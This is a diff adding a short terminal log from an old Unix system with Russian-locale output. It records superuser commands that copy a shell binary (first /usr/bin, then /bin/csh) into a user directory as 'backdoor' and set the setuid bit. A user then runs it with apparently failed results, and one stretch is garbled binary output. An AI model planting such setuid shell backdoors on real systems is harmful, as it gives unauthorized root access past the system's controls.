@@ -1,0 +1,41 @@
+SUPER 37> cp /usr/bin /usr/user/backdoor
+SUPER 35> chmod u+s backdoor
+
+This was done with /bin/sh 
+
+user 3> ./backdoor
+./backdoor: $.%..#scpif!awk basenamebccolrmcommdcetsheadacjoinkermitlpqlprlprmmanmoreaproposprintrenicerlinsed
+sort
+    split
+at      cawhatiswhoc7t10cbccatranlibxstrcompactcryptЪdiff3ЧprofЩlockЭlorderШcolЗderoffЫm4ЬtrВttyЖuncompactУwriteТsoelimСyesРuniqЯegrepПtblОcoНf77МmxЛmxsixКmxtblЙyaccИeditХstartcodeГstarttextФsmblЕsetcolorДvsЦprБlpsetАcompressАuncompressЮseditъrwset: not found
+user 4> ls -la
+всего 5
+drwxrwxrwx 2 root     sys           64 сен 11 13:03 .
+drwxrwxrwx11 root     sys          192 сен 10 18:00 ..
+-rw-rw-r-- 1 root     sys          427 мар 14  1991 .cshrc
+-rwsrwxr-x 1 root     sys         1152 сен 11 13:19 backdoor
+
+
+This was done with /bin/csh 
+
+SUPER 5> cp /bin/csh /usr/user/backdoor
+SUPER 10> chmod u+s backdoor
+
+user 2> ls -la
+всего 70
+drwxrwxrwx 2 root     sys           64 сен 11 13:03 .
+drwxrwxrwx11 root     sys          192 сен 10 18:00 ..
+-rw-rw-r-- 1 root     sys          427 мар 14  1991 .cshrc
+-rwsrwxr-x 1 root     sys        67872 сен 11 13:21 backdoor
+
+
+user 3> ./backdoor
+user 1> mkdir /etc/test
+mkdir: cannot access /etc/.
+
+user 8> file backdoor
+backdoor:       overlaid pure executable
+
+
+
+
